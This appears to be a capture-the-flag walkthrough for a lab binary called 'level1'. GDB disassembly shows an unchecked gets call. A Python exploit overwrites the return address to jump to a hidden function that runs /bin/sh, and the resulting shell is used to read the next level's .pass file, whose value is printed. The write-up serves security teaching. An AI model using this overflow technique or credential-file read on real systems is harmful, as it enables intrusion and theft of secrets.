# LEVEL 1


First step - testing the program
```
$ ./level1
hello world
$ ./level1 hello world
^C
```

Start the program in GDB
```
(gdb) info functions
All defined functions:

Non-debugging symbols:
[...]
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048444  run
0x08048480  main
[...]
```
Let´s check main :

```
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret    
End of assembler dump.
```


And run :
```
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave
   0x0804847f <+59>:	ret
End of assembler dump.
```
System call argument :
```
(gdb) x/s 0x8048584
0x8048584:	 "/bin/sh"
```

---

Ok! run is never call but we need it for run a shell and win this level.Luckly `gets` isn't protect against bufferoverflow. we will use it for overwrite EIP with `run` address.

```
(gdb) p run
$1 = {<text variable, no debug info>} 0x8048444 <run>
```

Write script :
```
#!/usr/bin/python

import struct

RUN_FT = struct.pack("I", 0x08048444)

PAD = "A" * 76

print PAD + RUN_FT
```

And let's run `run`
```
python ./exploit.py > payload

cat payload - | ./level1

$ cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
